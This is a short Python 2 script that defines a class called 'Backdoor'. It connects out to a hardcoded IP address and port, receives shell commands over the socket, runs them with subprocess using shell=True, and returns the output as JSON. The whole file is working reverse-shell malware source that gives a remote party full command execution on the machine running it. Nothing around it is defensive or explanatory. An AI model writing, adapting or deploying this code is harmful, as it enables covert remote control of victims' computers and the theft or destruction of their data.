#....use python2 while running in window.......

import socket
import subprocess
import json
import os
class Backdoor:
  def __init__(self,ip,port):
    self.connection=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    self.connection.connect((ip,port))

  def execute_command(self,command):
    return subprocess.check_output(command,shell=True)

  def box_send(self,data):
    json_data=json.dumps(data)
    self.connection.send(json_data)
  def box_receive(self):
        json_data=self.connection.recv(1024)
        return json.loads(json_data)       

  def run(self):
    while  True:
      try:
        command=self.box_receive()
        command_result=self.execute_command(command)
        self.box_send(command_result)
      except Exception:
        command_result="[+]error" 
        self.box_send(command_result)
 
backdoor=Backdoor("192.168.1.29",80)
backdoor.run()
